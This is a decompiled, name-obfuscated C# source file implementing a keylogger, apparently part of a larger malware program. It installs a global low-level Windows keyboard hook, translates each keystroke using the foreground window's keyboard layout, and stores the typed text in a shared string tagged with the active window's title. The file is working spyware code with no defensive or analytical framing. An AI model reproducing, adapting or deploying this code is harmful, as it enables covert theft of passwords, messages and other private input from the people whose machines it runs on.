using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ns14;

namespace ns15;

internal sealed class Class71
{
	private delegate IntPtr Delegate0(int nCode, IntPtr wParam, IntPtr lParam);

	private const int int_0 = 256;

	private const int int_1 = 13;

	private static IntPtr intptr_0 = IntPtr.Zero;

	private static Delegate0 delegate0_0 = smethod_2;

	public static bool bool_0 = false;

	public static string string_0 = "";

	private static string string_1;

	public static Thread thread_0 = new Thread(smethod_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int int_2, Delegate0 delegate0_1, IntPtr intptr_1, uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr intptr_1, int int_2, IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr intptr_1, out uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	private static extern short GetKeyState(int int_2);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint uint_0);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_2, uint uint_2, IntPtr intptr_1);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	private static void smethod_0()
	{
		intptr_0 = smethod_1(delegate0_0);
		Application.Run();
	}

	private static IntPtr smethod_1(Delegate0 delegate0_1)
	{
		using Process process = Process.GetCurrentProcess();
		return SetWindowsHookEx(13, delegate0_1, GetModuleHandle(process.ProcessName), 0u);
	}

	private static IntPtr smethod_2(int int_2, IntPtr intptr_1, IntPtr intptr_2)
	{
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		if (!bool_0)
		{
			return IntPtr.Zero;
		}
		if (int_2 >= 0 && intptr_1 == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(intptr_2);
			bool flag = (GetKeyState(20) & 0xFFFF) != 0;
			bool flag2 = ((uint)GetKeyState(160) & 0x8000u) != 0 || (GetKeyState(161) & 0x8000) != 0;
			string text = smethod_3((uint)num);
			text = ((!(flag || flag2)) ? text.ToLower() : text.ToUpper());
			Keys val;
			if (num >= 112 && num <= 135)
			{
				val = (Keys)num;
				text = "[" + ((object)(Keys)(ref val)).ToString() + "]";
			}
			else
			{
				val = (Keys)num;
				string text2 = ((object)(Keys)(ref val)).ToString();
				switch (Class91.smethod_0(text2))
				{
				case 497839467u:
					if (text2 == "LControlKey")
					{
						text = "[CTRL]";
					}
					break;
				case 298493515u:
					if (text2 == "Capital")
					{
						text = ((!flag) ? "[CAPSLOCK: ON]" : "[CAPSLOCK: OFF]");
					}
					break;
				case 3250860581u:
					if (text2 == "Space")
					{
						text = " ";
					}
					break;
				case 3082514982u:
					if (text2 == "Escape")
					{
						text = "[ESC]";
					}
					break;
				case 547024555u:
					if (text2 == "LWin")
					{
						text = "[WIN]";
					}
					break;
				case 3822460366u:
					if (text2 == "RShiftKey")
					{
						text = "[Shift]";
					}
					break;
				case 3422663135u:
					if (text2 == "Return")
					{
						text = "[ENTER]";
					}
					break;
				case 3264564162u:
					if (text2 == "Back")
					{
						text = "[Back]";
					}
					break;
				case 4219689196u:
					if (text2 == "Tab")
					{
						text = "[Tab]";
					}
					break;
				case 4117013200u:
					if (text2 == "LShiftKey")
					{
						text = "[Shift]";
					}
					break;
				case 3954224277u:
					if (text2 == "RControlKey")
					{
						text = "[CTRL]";
					}
					break;
				}
			}
			if (text.Equals("[ENTER]"))
			{
				if (string_1 == Class69.string_0)
				{
					string_0 += Environment.NewLine;
				}
				else
				{
					string_1 = Class69.string_0;
					string_0 = string_0 + "\n###  " + string_1 + " ###\n";
				}
			}
			else if (text.Equals("[Back]") && string_0.Length > 0)
			{
				string_0 = string_0.Remove(string_0.Length - 1, 1);
			}
			else
			{
				string_0 += text;
			}
		}
		return CallNextHookEx(intptr_0, int_2, intptr_1, intptr_2);
	}

	private static string smethod_3(uint uint_0)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[256];
			if (!GetKeyboardState(byte_))
			{
				return "";
			}
			uint uint_ = MapVirtualKey(uint_0, 0u);
			uint uint_2;
			IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(Class69.GetForegroundWindow(), out uint_2));
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, keyboardLayout);
			return stringBuilder.ToString();
		}
		catch
		{
		}
		Keys val = (Keys)uint_0;
		return ((object)(Keys)(ref val)).ToString();
	}
}
